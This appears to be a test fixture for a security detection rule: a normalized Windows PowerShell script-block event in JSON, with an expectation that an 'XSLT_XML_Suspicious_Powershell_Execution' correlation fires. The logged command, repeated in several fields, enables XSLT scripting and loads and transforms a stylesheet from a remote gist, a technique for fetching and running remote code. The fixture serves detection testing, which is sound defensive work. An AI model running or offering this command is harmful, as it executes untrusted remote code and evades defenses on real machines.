{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2023-07-05T00:44:45.928955000Z\"},\"EventRecordID\":\"1252802\",\"Correlation\":{\"ActivityID\":\"{fc27780d-9e5b-0000-a738-61fe5b9ed901}\"},\"Execution\":{\"ProcessID\":\"2040\",\"ThreadID\":\"5388\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"pc.domain.com\",\"Security\":{\"UserID\":\"S-1-5-21-936165926-1453112849-1990505774-500\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;\",\"Name\":\"ScriptBlockText\"},{\"text\":\"00d79587-df99-4df9-9661-80bfec048bcf\",\"Name\":\"ScriptBlockId\"},{\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "datafield5": "$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;", "event_src.category": "Operating system", "event_src.fqdn": "pc.domain.com", "event_src.host": "pc.domain.com", "event_src.hostname": "pc", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "object.id": "00d79587-df99-4df9-9661-80bfec048bcf", "object.process.cmdline": "$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;", "object.process.id": "2040", "object.value": "$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xml','z');del z;", "recv_ipv4": "127.0.0.1", "recv_time": "2023-07-06T23:44:17.615Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "subject.id": "S-1-5-21-936165926-1453112849-1990505774-500", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2023-07-05T00:44:45.928Z", "type": "raw", "uuid": "e283f116-2ca3-4593-adac-a1cc6fe0795a"}

expect 1 {"correlation_name": "XSLT_XML_Suspicious_Powershell_Execution"}